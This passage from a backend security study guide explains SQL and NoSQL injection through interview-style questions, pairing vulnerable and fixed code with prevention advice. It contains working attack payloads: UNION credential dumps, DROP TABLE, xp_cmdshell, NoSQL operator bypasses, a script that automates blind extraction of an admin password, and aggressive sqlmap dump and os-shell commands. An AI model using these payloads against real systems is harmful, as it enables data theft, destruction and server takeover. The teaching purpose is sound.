if (!allowedTables.includes(table)) {
  throw new Error('Invalid table');
}

// ❌ Still vulnerable - ORDER BY / LIMIT can't be parameterized
const query = `SELECT * FROM users ORDER BY ${sortBy} ${order}`; // Vulnerable!

// ✅ Fix: Whitelist
const allowedFields = ['id', 'username', 'email'];
const allowedOrders = ['ASC', 'DESC'];
if (!allowedFields.includes(sortBy) || !allowedOrders.includes(order)) {
  throw new Error('Invalid parameters');
}
```

**Key Insight:**
> **Parameterized queries are the ONLY reliable defense.** Input validation, escaping, and ORMs help but aren't foolproof. Always use parameterized queries for WHERE, INSERT, UPDATE values. Use whitelisting for dynamic parts like table names, column names, and ORDER BY.

---

### Q3: Can ORMs completely prevent SQL injection? When can they still be vulnerable?

**Answer:**

ORMs (Sequelize, TypeORM, Prisma) **significantly reduce** SQL injection risk by using parameterized queries internally, but they **can still be vulnerable** if misused.

**When ORMs Are Safe:**

```javascript
// ✅ SAFE - ORM query builders use parameterized queries
const user = await User.findOne({
  where: { username, password },
});

// ✅ SAFE - Sequelize conditions
const products = await Product.findAll({
  where: {
    category: 'electronics',
    price: { [Sequelize.Op.between]: [100, 500] },
  },
});

// ✅ SAFE - TypeORM query builder
const users = await userRepository
  .createQueryBuilder('user')
  .where('user.age > :age', { age: 18 })
  .getMany();
```

**When ORMs Are Still Vulnerable:**

**1. Raw Queries Without Parameters:**

```javascript
// ❌ VULNERABLE - String concatenation in raw query
const username = req.body.username;
const users = await sequelize.query(
  `SELECT * FROM users WHERE username = '${username}'`
);

// Attack: username = ' OR '1'='1
// Result: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users!

// ✅ SAFE - Raw query with parameters
const users = await sequelize.query(
  'SELECT * FROM users WHERE username = :username',
  {
    replacements: { username },
    type: Sequelize.QueryTypes.SELECT,
  }
);
```

**2. Dynamic Table/Column Names:**

```javascript
// ❌ VULNERABLE - User controls table name
const tableName = req.query.table;
const results = await sequelize.query(`SELECT * FROM ${tableName}`);

// Attack: ?table=users; DROP TABLE users--
// Result: Drops users table!

// ✅ SAFE - Whitelist allowed tables
const allowedTables = ['users', 'products', 'orders'];
if (!allowedTables.includes(tableName)) {
  throw new Error('Invalid table');
}
```

**3. ORDER BY Injection:**

```javascript
// ❌ VULNERABLE - User controls sort field
const sortBy = req.query.sortBy;
const users = await User.findAll({
  order: [[sortBy, 'ASC']], // Can be exploited in some ORMs
});

// ✅ SAFE - Whitelist sort fields
const allowedFields = ['id', 'username', 'email', 'created_at'];
if (!allowedFields.includes(sortBy)) {
  throw new Error('Invalid sort field');
}
```

**4. Unsafe ORM Methods:**

```javascript
// ❌ VULNERABLE - Sequelize.literal (bypasses protection)
const filter = req.query.filter;
const users = await User.findAll({
  where: Sequelize.literal(filter), // DANGEROUS!
});

// Attack: ?filter=1=1 OR 1=1
// Bypasses all ORM protections

// ✅ SAFE - Don't use literal() with user input
```

**5. Mass Assignment Vulnerabilities:**

```javascript
// ❌ VULNERABLE - User can set any field
app.post('/users', async (req, res) => {
  const user = await User.create(req.body); // Mass assignment
});

// Attack: { username: 'hacker', role: 'admin' }
// Result: Creates admin user!

// ✅ SAFE - Whitelist allowed fields
const { username, email, password } = req.body;
const user = await User.create({ username, email, password });
```

**Comparison:**

| Scenario | Safe? | Why |
|----------|-------|-----|
| ORM query builder | ✅ Yes | Uses parameterized queries |
| ORM raw query with params | ✅ Yes | Parameters are bound safely |
| ORM raw query without params | ❌ No | String concatenation |
| Dynamic table/column names | ❌ No | Can't parameterize identifiers |
| Sequelize.literal() | ❌ No | Bypasses all protections |
| Mass assignment | ⚠️ Maybe | Depends on field whitelisting |

**Best Practices:**

```
✅ Use ORM query builders (findOne, findAll, create, update)
✅ Always use parameter binding in raw queries
✅ Whitelist dynamic identifiers (tables, columns)
✅ Never use .literal() or similar with user input
✅ Whitelist fields for mass assignment
✅ Keep ORM library updated
```

**Key Insight:**
> **ORMs are safe by default but not foolproof.** They prevent SQLi when using their query builders, but raw queries, dynamic identifiers, and unsafe methods can still be exploited. Always use parameterized queries in raw SQL and whitelist any dynamic parts.

---

### Q4: What is the difference between SQL injection and NoSQL injection?

**Answer:**

Both allow attackers to manipulate database queries, but the attack vectors and prevention methods differ.

**SQL Injection:**

```javascript
// ❌ VULNERABLE SQL
const query = `SELECT * FROM users WHERE username = '${username}'`;

// Attack: username = ' OR '1'='1
// Result: SELECT * FROM users WHERE username = '' OR '1'='1'
// Returns all users
```

**NoSQL Injection (MongoDB):**

```javascript
// ❌ VULNERABLE NoSQL
const user = await User.findOne({
  username: req.body.username,
  password: req.body.password
});

// Attack: POST /login
// { "username": {"$ne": null}, "password": {"$ne": null} }
// Result: Matches first user where username and password exist
// Bypasses authentication!
```

**Comparison:**

| Aspect | SQL Injection | NoSQL Injection |
|--------|---------------|-----------------|
| **Target** | Relational databases | Document databases |
| **Attack Method** | Inject SQL syntax | Inject query operators |
| **Common Payload** | `' OR '1'='1` | `{"$ne": null}` |
| **Primary Defense** | Parameterized queries | Type validation |
| **Language** | SQL syntax | JSON/BSON objects |

**SQL Injection Attack Types:**

```sql
-- Authentication bypass
' OR '1'='1

-- UNION attack
' UNION SELECT username, password FROM users--

-- Time-based blind
'; WAITFOR DELAY '00:00:05'--

-- Database enumeration
' UNION SELECT table_name FROM information_schema.tables--
```

**NoSQL Injection Attack Types:**

```javascript
// Authentication bypass
{ "username": {"$gt": ""}, "password": {"$gt": ""} }

// Regex injection (extract data character by character)
{ "username": "admin", "password": {"$regex": "^a"} }

// JavaScript injection (if $where is enabled)
{ "$where": "this.username == 'admin' || '1'=='1'" }

// Operator injection
{ "username": {"$nin": [""]}, "password": {"$nin": [""]} }
```

**Prevention Comparison:**

**SQL Injection Prevention:**

```javascript
// ✅ Parameterized queries
const query = 'SELECT * FROM users WHERE username = ? AND password = ?';
db.query(query, [username, password]);

// ✅ ORM
const user = await User.findOne({ where: { username, password } });

// ✅ Stored procedures
connection.query('CALL GetUser(?, ?)', [username, password]);
```

**NoSQL Injection Prevention:**

```javascript
// ✅ Type validation
if (typeof username !== 'string' || typeof password !== 'string') {
  throw new Error('Invalid input types');
}

const user = await User.findOne({ username, password });

// ✅ Sanitization
const mongoSanitize = require('mongo-sanitize');
const clean = {
  username: mongoSanitize(req.body.username),
  password: mongoSanitize(req.body.password),
};

// ✅ Schema validation (Mongoose)
const userSchema = new mongoose.Schema({
  username: { type: String, required: true },
  password: { type: String, required: true },
}, { strict: true });
// Rejects non-string values like {"$ne": null}

// ✅ Input validation (Joi)
const schema = Joi.object({
  username: Joi.string().required(),
  password: Joi.string().required(),
});
```

**Real-World Attack Examples:**

**SQL Injection:**

```javascript
// Attack database dump
id: 1 UNION SELECT table_name, column_name FROM information_schema.columns--

// Attack privilege escalation
bio: '; UPDATE users SET role='admin' WHERE id=1--

// Attack server takeover (if permissions allow)
id: 1; EXEC xp_cmdshell('whoami')--
```

**NoSQL Injection:**

```javascript
// Attack: Extract password character by character
POST /login
{
  "username": "admin",
  "password": {"$regex": "^a"}
}
// If login succeeds, password starts with 'a'
// Repeat for each character: "^ab", "^abc", etc.

// Attack: Bypass with operators
{
  "username": {"$in": ["admin", "root"]},
  "password": {"$exists": true}
}

// Attack: JavaScript injection (if $where enabled)
{
  "$where": "sleep(5000) || true"
}
// Time-based attack
```

**Key Differences:**

```
SQL Injection:
✓ String-based attacks (' OR '1'='1)
✓ Fixed schema (tables, columns)
✓ Prevented by parameterized queries
✓ More mature security understanding

NoSQL Injection:
✓ Object/operator-based attacks ({"$ne": null})
✓ Flexible schema (JSON documents)
✓ Prevented by type validation
✓ Less well-known but equally dangerous
```

**Key Insight:**
> **Both are dangerous, just different attack methods.** SQL injection injects SQL syntax in strings. NoSQL injection injects query operators in objects. Prevention is different: SQL needs parameterized queries, NoSQL needs type validation. Both require treating user input as untrusted data.

---

### Q5: What is blind SQL injection and how does it work?

**Answer:**

Blind SQL injection is when attackers can't see query results directly but infer information from **application behavior** (true/false responses or time delays).

**Types of Blind SQL Injection:**

**1. Boolean-Based Blind SQLi:**

Attacker infers data based on true/false responses.

```javascript
// Vulnerable endpoint
app.get('/user/:id', (req, res) => {
  const query = `SELECT * FROM users WHERE id = ${req.params.id}`;

  db.query(query, (err, results) => {
    if (results.length > 0) {
      res.json({ exists: true, message: 'User found' });
    } else {
      res.json({ exists: false, message: 'User not found' });
    }
  });
});
```

**Attack Process:**

```sql
-- Step 1: Test if SQLi works
GET /user/1 AND 1=1
-- Response: { exists: true } → Condition is true

GET /user/1 AND 1=2
-- Response: { exists: false } → Condition is false
-- Conclusion: SQL injection is possible!

-- Step 2: Extract database version length
GET /user/1 AND LENGTH(VERSION())>1
-- Response: { exists: true } → Version is longer than 1 character

GET /user/1 AND LENGTH(VERSION())>100
-- Response: { exists: false } → Version is less than 100 characters

-- Binary search to find exact length...

-- Step 3: Extract version character by character
GET /user/1 AND SUBSTRING(VERSION(),1,1)='5'
-- Response: { exists: true } → First character is '5'

GET /user/1 AND SUBSTRING(VERSION(),2,1)='.'
-- Response: { exists: true } → Second character is '.'

-- Continue for each character...

-- Step 4: Extract admin password
GET /user/1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='a'
-- Response: { exists: false } → First character is NOT 'a'

GET /user/1 AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='admin')='p'
-- Response: { exists: true } → First character IS 'p'

-- Continue extracting each character...
```

**2. Time-Based Blind SQLi:**

Attacker infers data based on response time.

```javascript
// Vulnerable endpoint
app.get('/product/:id', (req, res) => {
  const query = `SELECT * FROM products WHERE id = ${req.params.id}`;

  db.query(query, (err, results) => {
    // Always returns the same response (no info leak)
    res.json({ message: 'Query executed' });
  });
});
```

**Attack Process:**

```sql
-- Test 1: Baseline response time
GET /product/1
-- Response time: 50ms

-- Test 2: Inject delay
GET /product/1; IF (1=1) WAITFOR DELAY '00:00:05'--
-- Response time: 5050ms (5 seconds delay + 50ms)
-- Conclusion: SQL injection works!

-- Test 3: Extract data conditionally
GET /product/1; IF (SELECT COUNT(*) FROM users)>10 WAITFOR DELAY '00:00:05'--
-- If response takes 5+ seconds → More than 10 users
-- If response takes ~50ms → Less than 10 users

-- Test 4: Extract admin password character by character
GET /product/1; IF (SELECT SUBSTRING(password,1,1) FROM users WHERE id=1)='a' WAITFOR DELAY '00:00:05'--
-- If 5 second delay → First character is 'a'
-- If no delay → First character is NOT 'a'

-- Different databases have different delay functions:
-- MySQL: SELECT SLEEP(5)
-- PostgreSQL: SELECT pg_sleep(5)
-- SQLite: SELECT randomblob(100000000) (computationally expensive)
-- Oracle: DBMS_LOCK.SLEEP(5)
```

**Real Attack Example:**

```javascript
// Vulnerable search endpoint
app.get('/search', (req, res) => {
  const { keyword } = req.query;

  const query = `SELECT * FROM articles WHERE title LIKE '%${keyword}%'`;

  db.query(query, (err, results) => {
    if (err) {
      res.json({ results: [] }); // Hides errors
    } else {
      res.json({ results }); // Shows results
    }
  });
});
```

**Attacker Extracts Admin Password:**

```javascript
// Script to automate blind SQLi
const charset = 'abcdefghijklmnopqrstuvwxyz0123456789';
let password = '';

for (let position = 1; position <= 20; position++) {
  for (const char of charset) {
    const payload = `' AND (SELECT SUBSTRING(password,${position},1) FROM users WHERE username='admin')='${char}' AND '1'='1`;

    const response = await fetch(`http://example.com/search?keyword=${payload}`);
    const data = await response.json();

    if (data.results.length > 0) {
      // Boolean true - character matched
      password += char;
      console.log(`Found character: ${char}, password so far: ${password}`);
      break;
    }
  }
}

console.log(`Full password: ${password}`);
```

**Detection and Prevention:**

**Detection:**

```
🔴 Multiple similar requests with slight variations
🔴 Requests with unusual delays (SLEEP, WAITFOR)
🔴 Requests with boolean conditions (AND 1=1, OR 1=2)
🔴 Requests with SUBSTRING, LENGTH, ASCII functions
🔴 Requests to same endpoint hundreds of times
```

**Prevention:**

```javascript
// ✅ 1. Parameterized queries (PRIMARY)
const query = 'SELECT * FROM users WHERE id = ?';
db.query(query, [userId]);

// ✅ 2. Rate limiting
const rateLimit = require('express-rate-limit');
const limiter = rateLimit({
  windowMs: 1 * 60 * 1000, // 1 minute
  max: 20, // 20 requests per minute
});
app.use('/search', limiter);

// ✅ 3. Same response for all cases (don't leak info)
if (results.length > 0) {
  res.json({ success: true });
} else {
  res.json({ success: true }); // Same response!
}

// ✅ 4. WAF (Web Application Firewall)
// Detects blind SQLi patterns (SLEEP, WAITFOR, multiple similar requests)

// ✅ 5. Monitor response times
// Alert on sudden increase in response times
```

**Why Blind SQLi Is Dangerous:**

```
❌ Harder to detect (no obvious error messages)
❌ Slow but effective (automated tools can extract all data)
❌ Works even when app hides errors
❌ Can extract any data from database
❌ Often missed by simple security scans
```

**Key Insight:**
> **Blind SQL injection proves that hiding errors doesn't prevent SQLi.** Attackers extract data bit by bit using true/false responses or time delays. The only real defense is parameterized queries - never string concatenation, regardless of whether you show errors or not.

---

### Q6: How would you test an application for SQL injection vulnerabilities?

**Answer:**

Testing for SQL injection requires both **manual testing** and **automated tools** to identify vulnerabilities.

**Manual Testing Steps:**

**Step 1: Identify Input Points**

```
Test ALL user inputs:
✓ URL parameters (?id=1, ?search=query)
✓ Form fields (login, search, profile update)
✓ Hidden form fields
✓ HTTP headers (User-Agent, Referer, Cookie)
✓ POST body (JSON, XML, form data)
✓ File uploads (filename, metadata)
```

**Step 2: Basic SQL Injection Payloads**

```sql
-- Test 1: Single quote (causes SQL syntax error)
'
-- Expected: Error message or different behavior

-- Test 2: Comment injection
' --
'#
'/*

-- Test 3: Boolean tests
' OR '1'='1
' OR '1'='2
' AND '1'='1
' AND '1'='2

-- Test 4: Time-based
'; WAITFOR DELAY '00:00:05'--
'; SELECT SLEEP(5)--

-- Test 5: UNION attack
' UNION SELECT NULL--
' UNION SELECT NULL, NULL--
' UNION SELECT NULL, NULL, NULL--

-- Test 6: Stacked queries
'; DROP TABLE test--
'; SELECT @@version--
```

**Step 3: Systematic Testing**

```javascript
// Test each input field methodically

// Original request
GET /product?id=1

// Test 1: Add single quote
GET /product?id=1'
// Expected: Error or different behavior

// Test 2: Boolean true
GET /product?id=1' OR '1'='1
// Expected: Different results (more products shown)

// Test 3: Boolean false
GET /product?id=1' AND '1'='2
// Expected: No results

// Test 4: Time delay
GET /product?id=1'; SELECT SLEEP(5)--
// Expected: 5 second delay

// Test 5: UNION attack
GET /product?id=1' UNION SELECT username, password FROM users--
// Expected: Additional data displayed
```

**Step 4: Verify Vulnerability**

```javascript
// If SQLi exists, extract data

// Find number of columns
GET /product?id=1' ORDER BY 1--  // Works
GET /product?id=1' ORDER BY 2--  // Works
GET /product?id=1' ORDER BY 3--  // Works
GET /product?id=1' ORDER BY 4--  // Error
// Conclusion: 3 columns

// Extract data with UNION
GET /product?id=1' UNION SELECT username, password, email FROM users--
// Returns user credentials

// Enumerate database
GET /product?id=1' UNION SELECT table_name, NULL, NULL FROM information_schema.tables--
// Lists all tables
```

**Automated Testing:**

**1. SQLMap (Most Popular):**

```bash
# Install
pip install sqlmap

# Basic scan
sqlmap -u "http://example.com/product?id=1"

# Scan with POST data
sqlmap -u "http://example.com/login" --data="username=admin&password=pass"

# Scan with authentication
sqlmap -u "http://example.com/profile" --cookie="session=abc123"

# Find databases
sqlmap -u "http://example.com/product?id=1" --dbs

# Enumerate specific database
sqlmap -u "http://example.com/product?id=1" -D myapp --tables

# Dump specific table
sqlmap -u "http://example.com/product?id=1" -D myapp -T users --dump

# Get database banner
sqlmap -u "http://example.com/product?id=1" --banner

# Check for OS access
sqlmap -u "http://example.com/product?id=1" --os-shell

# Batch mode (non-interactive)
sqlmap -u "http://example.com/product?id=1" --batch --dump-all

# Risk and level (more aggressive)
sqlmap -u "http://example.com/product?id=1" --level=5 --risk=3
```

**2. Burp Suite:**

```
1. Intercept HTTP requests
2. Send to Repeater
3. Modify parameters with SQLi payloads
4. Observe responses
5. Use Scanner for automated detection
```

**3. OWASP ZAP:**

```
1. Proxy traffic through ZAP
2. Spider the application
3. Run Active Scan
4. Review SQL Injection alerts
5. Manually verify findings
```

**Testing Different Scenarios:**

**Login Form:**

```javascript
// Test username field
username: admin' --
username: ' OR '1'='1
username: admin' AND '1'='2
username: ' UNION SELECT NULL, NULL--

// Test password field
password: ' OR '1'='1
password: '; DROP TABLE users--
```

**Search Box:**

```javascript
// Test search parameter
search: ' OR '1'='1
search: '; SELECT SLEEP(5)--
search: ' UNION SELECT username, password FROM users--
```

**Hidden Fields:**

```html
<!-- Original -->
<input type="hidden" name="product_id" value="123">

<!-- Modified with Burp Suite -->
<input type="hidden" name="product_id" value="123' OR '1'='1">
```

**JSON API:**

```json
// Original request
{
  "username": "admin",
  "password": "pass"
}

// Test SQLi
{
  "username": "admin' --",
  "password": "anything"
}

// Test NoSQL injection
{
  "username": {"$ne": null},
  "password": {"$ne": null}
}
```

**Security Testing Checklist:**

```
✅ Test all input fields (visible and hidden)
✅ Test URL parameters
✅ Test HTTP headers (User-Agent, Referer)
✅ Test cookies
✅ Test POST body (form data, JSON, XML)
✅ Test numeric and string inputs
✅ Test different SQLi types (boolean, time-based, UNION)
✅ Test error messages (do they reveal DB info?)
✅ Test with special characters (', ", `, --, #, /*)
✅ Verify WAF/security controls
✅ Check database user permissions
✅ Review error logs
```

**Reporting Findings:**

```
1. Severity: Critical / High / Medium / Low
2. Affected endpoint: /product?id=
3. Parameter: id
4. Payload: ' OR '1'='1
5. Impact: Authentication bypass, data theft
6. Proof of concept: [Screenshot/video]
7. Remediation: Use parameterized queries
```

**Key Insight:**
> **Test systematically, not randomly.** Start with simple payloads (single quote) to identify vulnerabilities, then escalate to extract data. Use both manual testing (understand the vulnerability) and automated tools (comprehensive coverage). Always get written permission before testing - unauthorized testing is illegal.

---

## Best Practices

### ✅ Do's

**1. Always Use Parameterized Queries**
- ✅ Primary defense against SQL injection
- ✅ Use ? or $1 placeholders
- ✅ Works for all data types
- ✅ No escaping needed

**2. Use ORM Safely**
- ✅ Leverage ORM query builders
- ✅ Use parameter binding in raw queries
- ✅ Keep ORM libraries updated
- ✅ Enable strict mode

**3. Validate and Sanitize Input**
- ✅ Validate data types
- ✅ Whitelist allowed values
- ✅ Check length and format
- ✅ Reject suspicious patterns

**4. Apply Principle of Least Privilege**
- ✅ Create limited database users
- ✅ Grant minimal permissions
- ✅ No DROP, CREATE, FILE permissions
- ✅ Read-only where possible

**5. Whitelist Dynamic Values**
- ✅ Whitelist table names
- ✅ Whitelist column names
- ✅ Whitelist ORDER BY fields
- ✅ Reject unknown values

**6. Implement Defense in Depth**
- ✅ Parameterized queries (primary)
- ✅ Input validation (secondary)
- ✅ WAF (Web Application Firewall)
- ✅ Rate limiting
- ✅ Database activity monitoring

**7. Handle Errors Securely**
- ✅ Generic error messages to users
- ✅ Detailed logs for developers
- ✅ Don't expose database structure
- ✅ Don't reveal SQL syntax

**8. Regular Security Testing**
- ✅ Automated security scans
- ✅ Penetration testing
- ✅ Code reviews
- ✅ SQLMap testing

**9. Monitor and Log**
- ✅ Log all database queries
- ✅ Monitor for suspicious patterns
- ✅ Alert on SQLi attempts
- ✅ Review logs regularly

**10. Keep Software Updated**
- ✅ Update database software
- ✅ Update application frameworks
- ✅ Update ORM libraries
- ✅ Patch security vulnerabilities

### ❌ Don'ts

**1. Never Concatenate User Input**
- ❌ No string concatenation in SQL
- ❌ No template literals with user input
- ❌ Always use parameterized queries

**2. Never Trust User Input**
- ❌ Not from forms
- ❌ Not from URLs
- ❌ Not from headers
- ❌ Not from hidden fields

**3. Never Expose Database Errors**
- ❌ Don't show SQL syntax errors
- ❌ Don't reveal table/column names
- ❌ Don't expose database version
- ❌ Use generic error messages

**4. Never Use Root/Admin Accounts**
- ❌ Don't connect as root
- ❌ Don't give app user admin rights
- ❌ Create limited users per application
- ❌ Follow least privilege

**5. Never Parameterize Identifiers**
- ❌ Can't parameterize table names
- ❌ Can't parameterize column names
- ❌ Must whitelist these instead

**6. Never Rely on Escaping Alone**
- ❌ Escaping is not foolproof
- ❌ Database-specific escaping differs
- ❌ Easy to miss or forget
- ❌ Always use parameterized queries

**7. Never Use Dynamic SQL**
- ❌ Avoid string concatenation
- ❌ Don't build queries from strings
- ❌ Use stored procedures or ORM
- ❌ Use parameterized queries

**8. Never Skip Security Testing**
- ❌ Test all endpoints
- ❌ Test all input fields
- ❌ Use automated tools
- ❌ Regular penetration testing

**9. Never Ignore Security Warnings**
- ❌ Fix SQL injection immediately
- ❌ Don't dismiss security findings
- ❌ Prioritize security over features
- ❌ Update vulnerable dependencies

**10. Never Store Sensitive Data in Plain Text**
- ❌ Hash passwords (bcrypt)
- ❌ Encrypt sensitive data
- ❌ Don't log sensitive data
- ❌ Follow data protection laws

## Summary

- **SQL injection** is one of the most dangerous web vulnerabilities
- Occurs when user input is treated as **SQL code instead of data**
- Can lead to **authentication bypass, data theft, data deletion, and server takeover**
- **Parameterized queries** are the #1 defense - user input never interpreted as SQL
- **ORMs** help but can still be vulnerable if misused (raw queries, dynamic identifiers)
- **NoSQL databases** have similar injection risks with different attack vectors
- **Blind SQL injection** extracts data through boolean responses or time delays
- **Input validation** is defense in depth but not sufficient alone
- **Whitelist** dynamic parts that can't be parameterized (table names, ORDER BY)
- **Principle of least privilege** limits damage from successful attacks
- **Regular testing** with both manual methods and automated tools (SQLMap)
- **Never trust user input** - always validate, sanitize, and use parameterized queries

---
[← Back to Backend Security](../README.md)
